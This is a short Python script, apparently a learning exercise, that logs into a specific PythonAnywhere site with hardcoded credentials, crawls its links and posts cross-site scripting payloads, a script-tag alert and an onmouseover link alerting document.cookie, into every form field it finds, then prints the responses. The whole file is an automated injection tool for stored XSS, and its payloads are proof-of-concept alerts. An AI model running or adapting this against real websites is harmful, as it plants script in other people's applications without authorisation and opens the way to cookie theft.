import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup
import re
import requests

# 사용자에게 입력 받는 값
url = "http://soy3on.pythonanywhere.com"
user = {
    'login': 'bok',
    'password': 'bok'
}
###


###########
scripts = []
###########


session = requests.session()
session.post(url +"/accounts/login/", data=user)
res = session.get(url)

bs = BeautifulSoup(res.text, 'html.parser')

for link in bs.findAll('a'):
    if 'href' in link.attrs:
        input_resp = session.post(url + link.attrs['href'])
        if input_resp.text.find('input') > 0:
            print(link.attrs['href'])

            input_bs = BeautifulSoup(input_resp.text, 'html.parser')
            input_script = {
                str(input_bs.find('textarea').get('name')): '<a onmouseover=alert(document.cookie)>xss link</a>',
            }
            for input_tag in input_bs.find_all('input'):
                input_script[input_tag.get('name')] = '<script>alert(1)</script>'

            attack_resp = session.post(url + link.attrs['href'], data=input_script)
            print(attack_resp.text)


# if '&lt;script&gt;' not in input_resp.text:
#     print('insert success XSS')
# else:
#     print('file XSS')
#
